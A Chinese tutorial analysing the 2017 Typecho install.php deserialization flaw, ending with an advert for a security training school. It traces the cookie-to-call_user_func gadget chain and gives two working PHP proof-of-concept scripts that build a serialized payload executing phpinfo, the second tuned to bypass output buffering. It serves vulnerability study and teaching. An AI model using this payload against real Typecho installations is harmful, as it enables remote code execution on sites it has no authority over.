> 原文链接: https://www.anquanke.com//post/id/155306 


# 入门教学 | Typecho反序列化漏洞分析


                                阅读量   
                                **246174**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                    



[![](https://p1.ssl.qhimg.com/t0111071905ce7da655.jpg)](https://p1.ssl.qhimg.com/t0111071905ce7da655.jpg)

## 0x00 前言

反序列化漏洞一直在Java，PHP，中间件等层出不断，并且每次的爆发都能对互联网安全造成重大安全威胁。但是新手在理解反序列化漏洞还是存在着一定难度，对于代码逻辑如何跳转无法理顺。今天和大家一块分析一下2017年爆发的Typecho反序列化漏洞，希望各位大佬轻拍。

本文分析的漏洞存在于以下版本

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/2.png)[![](https://p2.ssl.qhimg.com/t01b2e4d0cfb99b8ff9.png)](https://p2.ssl.qhimg.com/t01b2e4d0cfb99b8ff9.png)

> git reset –hard 242fc1a

该漏洞主要存在于install.php文件中

> http://ip /install.php

在install.php第232行获取了 ‘_typecho_config’ Cookie信息后未进行过滤直接进行反序列操作，导致这个入口点可以直接进行反序列化攻击。 如下所示：

[![](https://p2.ssl.qhimg.com/t019e1874059d416272.png)](https://p2.ssl.qhimg.com/t019e1874059d416272.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/3.png)

## 0x01 代码分析

1.如果要将数据传入到漏洞点处，首先需要绕过文件首部验证[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/4.png)[![](https://p0.ssl.qhimg.com/t01c26993110a491634.png)](https://p0.ssl.qhimg.com/t01c26993110a491634.png)

> 1.1 文件首部首先会获取GET传参的finish参数，如果没有此参数程序将立马结束，所以需要在传入参数时把finish带入;
1.2. 程序为了阻挡跨站攻击，还会验证是否传入referer，如果没有referer头，程序将立马结束。所以访问install.php的文件时也需要带上本站任意referer值；

2.核心漏洞分析[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/5.png)[![](https://p1.ssl.qhimg.com/t01abe8272b8a4f117f.png)](https://p1.ssl.qhimg.com/t01abe8272b8a4f117f.png)

如图所示，install.php文件232行反序列化完成以后赋值给$config变量，紧接着234行使用此数据进行对象初始化。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/6.png)[![](https://p1.ssl.qhimg.com/t01017323dcaae45467.png)](https://p1.ssl.qhimg.com/t01017323dcaae45467.png)

Typecho_Db的类构造函数定义在Db.php中，如图所示，Typecho_Db类构造函数使用传入过来的值进行初始化，请注意红框内部，构造函数使用第一个变量与字符串进行拼接，如果$adapterName变量为对象，则将会调用__toString()魔术方法（如果读者不明白为什么会调用__toString方法，可参考【参考资料一】），所以此时可以在typecho程序内部寻找带有__toString方法的类。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/7.png)[![](https://p2.ssl.qhimg.com/t01abf9816f6a3ef602.png)](https://p2.ssl.qhimg.com/t01abf9816f6a3ef602.png)

寻找到varTypechoFeed.php文件中有__toString()方法，类名为Typecho_Feed。

分析Feed.php文件中的__toString()方法，发现在第290行，程序会调用私有变量所在类的__get()方法获取私有变量（【参考资料二】）。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/8.png)[![](https://p2.ssl.qhimg.com/t0120c43eef2b628bcd.png)](https://p2.ssl.qhimg.com/t0120c43eef2b628bcd.png)

寻找程序文件内部有__get()方法的类，最后选定varTypechoRequest.php文件中的Typecho_Request类，分析__get()方法。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/9.png)[![](https://p5.ssl.qhimg.com/t01b4b9269ec6b5a1ed.png)](https://p5.ssl.qhimg.com/t01b4b9269ec6b5a1ed.png)

程序调用get()方法，继续跟踪get()方法。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/10.png)[![](https://p0.ssl.qhimg.com/t01f99e14e8d8ffea0f.png)](https://p0.ssl.qhimg.com/t01f99e14e8d8ffea0f.png)

首先switch检测$key是否在$this-&gt;_params[$key]这个数组里面，如果有的话将值赋值给$value，紧着又对其他数组变量检测$key是否在里面，如果在数组里面没有检测$key，则将$value赋值成$default,最后判断一下$value类型，将$value传入到_applyFilter（）函数里面，继续跟踪_applyFiter()函数。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/11.png)[![](https://p3.ssl.qhimg.com/t01e1426698ff861301.png)](https://p3.ssl.qhimg.com/t01e1426698ff861301.png)

如果你对PHP语言熟悉，那么你将看到一个危险的函数，array_map和call_user_func，这两个系统内置函数将会自动为参数调用回调函数，具体来说，$filter是回调函数名字，$value是参数值，现在这个两个参数都可控。程序首先遍历类中$_filter变量，并且根据$value类型不同调用不同函数，如果$value是数组则将调用array_map，反之则将调用call_user_func到此为止，反序列化过程分析完毕（如果不明为什么可控，请接着往下看）。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/12.png)[![](https://p2.ssl.qhimg.com/t013e863f184df40b00.png)](https://p2.ssl.qhimg.com/t013e863f184df40b00.png)



## 0x02 利用方法

POC代码

```
&lt;?php
    class Typecho_Request
    `{`
        private $_params = array();
        private $_filter = array();

        public function __construct()
        `{`
            $this-&gt;_params['screenName'] = 1; // 执行的参数值
            $this-&gt;_filter[0] = 'phpinfo'; //filter执行的函数
        `}`
    `}`
    class Typecho_Feed`{`
        const RSS2 = 'RSS 2.0';
        private $_items = array();
        private $_type;
        function __construct()
        `{`
            $this-&gt;_type = self::RSS2; //进入toString内部判断条件
            $_item['author'] = new Typecho_Request(); //Feed.php文件中触发__get()方法使用的对象
            $this-&gt;_items[0] = $_item;
        `}`
    `}`
    $exp = new Typecho_Feed();
    $a = array(
        'adapter'=&gt;$exp, // Db.php文件中触发__toString()使用的对象
        'prefix' =&gt;'typecho_'
    );
    echo urlencode(base64_encode(serialize($a)));

?&gt;
```

代码执行[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/13.png)

[![](https://p1.ssl.qhimg.com/t01e28df232165fa6cd.png)](https://p1.ssl.qhimg.com/t01e28df232165fa6cd.png)

但是执行结果会发生错误：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/14.png)[![](https://p2.ssl.qhimg.com/t0189496365677b2241.png)](https://p2.ssl.qhimg.com/t0189496365677b2241.png)

为什么按照分析流程执行POC以后会发生错误？

经过分析发现，POC执行会导致Typecho触发异常，并且内部设置了Typecho_Exception异常类，触发异常以后Typecho会自动能捕捉到异常，并执行异常输出。

并且经过分析发现程序开头开启了ob_start(),该函数会将内部输出全部放入到缓冲区中，执行注入代码以后触发异常，导致ob_end_clean()执行，该函数会清空缓冲区。

解决方案：让程序强制退出，不执行Exception，这样原来的缓冲区内容就会输出出来。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/15.png)[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01178f414d3e24c07a.png)

如上图所示，在Feed.php中__toString方法中第293行，可以给item[‘category’]赋值上对象，让其用数组的方式遍历对象时触发错误，强制退出程序。

修改后的POC如下：

```
&lt;?php
    class Typecho_Request
    `{`
        private $_params = array();
        private $_filter = array();

        public function __construct()
        `{`
            $this-&gt;_params['screenName'] = 1; // 执行的参数值
            $this-&gt;_filter[0] = 'phpinfo'; //filter执行的函数
        `}`
    `}`
    class Typecho_Feed`{`
        const RSS2 = 'RSS 2.0'; //进入toString内部判断条件
        private $_items = array();
        private $_type;
        function __construct()
        `{`
            $this-&gt;_type = self::RSS2;
            $_item['author'] = new Typecho_Request(); //Feed.php文件中触发__get()方法使用的对象
        $_item['category'] = array(new Typecho_Request());//触发错误
            $this-&gt;_items[0] = $_item;
        `}`
    `}`
    $exp = new Typecho_Feed();
    $a = array(
        'adapter'=&gt;$exp, // Db.php文件中触发__toString()使用的对象
        'prefix' =&gt;'typecho_'
    );
    echo urlencode(base64_encode(serialize($a)));
?&gt;
```

代码执行：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/16.png)

[![](https://p1.ssl.qhimg.com/t016fbc691bad25cd31.png)](https://p1.ssl.qhimg.com/t016fbc691bad25cd31.png)

执行结果：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/17.png)[![](https://p4.ssl.qhimg.com/t0130daa9f1bccb9fda.png)](https://p4.ssl.qhimg.com/t0130daa9f1bccb9fda.png)



## 0x03 结语

反序列化的核心是利用未过滤的输入点，根据相应类构造恶意攻击数据，使得类中的危险函数得以执行，如果POC代码触发了异常，还需要让程序强制退出。

反序列化攻击对程序系统来说非常危险，如果程序没有禁止执行一些特殊危险函数，则将会直接获得系统Shell。

建议大家多进行动态调试，执行POC，动态查看POC中每个参数对程序的影响，这也会加深程序执行流程的理解。



## 0x04 参考资料

### 1. __toString魔术方法

在PHP中，如果输出普通字符串或者字符串变量时，可以直接调用echo函数，但如果echo对象是否可以呢？

代码： 注释掉__toString()[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/18.png)[![](https://p3.ssl.qhimg.com/t01bee9169fcecd300a.png)](https://p3.ssl.qhimg.com/t01bee9169fcecd300a.png)

输出：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/19.png)[![](https://p2.ssl.qhimg.com/t0108d61c9ccc10495c.png)](https://p2.ssl.qhimg.com/t0108d61c9ccc10495c.png)

程序出错，提示不能将对象转化成字符串。

PHP开发者专门设计了相应的方法来解决此问题，大家是否记得new FLAG()时候，程序为什么会自动将$info变量设置为输入值，因为，当初始化时候，程序会自动调用__construct方法进行初始化，所以当对象作为字符串的时候，程序会自动调用__toString魔术方法。

代码：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/20.png)[![](https://p4.ssl.qhimg.com/t0126e5a159f75ee342.png)](https://p4.ssl.qhimg.com/t0126e5a159f75ee342.png)

输出：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/21.png)[![](https://p5.ssl.qhimg.com/t013d0ea0a59cd4e83c.png)](https://p5.ssl.qhimg.com/t013d0ea0a59cd4e83c.png)

### 2. __get()魔术方法

在PHP中，类中的变量是有访问控制的，比如类中变量声明为私有变量外部是无法访问的，请看下面的代码：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/22.png)[![](https://p3.ssl.qhimg.com/t01c972ddf514e2716e.png)](https://p3.ssl.qhimg.com/t01c972ddf514e2716e.png)

输出：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/23.png)[![](https://p5.ssl.qhimg.com/t015d7f96f222591894.png)](https://p5.ssl.qhimg.com/t015d7f96f222591894.png)

程序提示无法读取类型中info变量。 PHP为了解决这个问题，专门在类中设计了__get()魔术方法，当对象调用类中私有变量时将会自动触发该方法，通过__get()方法把数据读出来。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/24.png)[![](https://p2.ssl.qhimg.com/t01b6e817d53a125961.png)](https://p2.ssl.qhimg.com/t01b6e817d53a125961.png)

输出[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](/Users/zouyanyun/Desktop/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/25.png)[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a733c82bcd309a23.png)

**360网络安全学院介绍**

360网络安全学院，是360旗下面向网络安全领域的职业技能培训机构，由360网络安全学院携手360网络安全技术专家团队，

并联合知名高校、行业专家，打造的面向高校学生、安全从业人员、社会公众的网络安全课程的职业技能培训机构。

360网络安全学院，总部位于北京，在全国拥有多所线下培训实训基地。学院目前开设《安全运维与响应》和《安全评估与审计》两大培训方向，

共涉及网络安全9大领域58门课程，分别设有4个月640个学时课程，是面向网络安全领域深入教研技能培训机构。
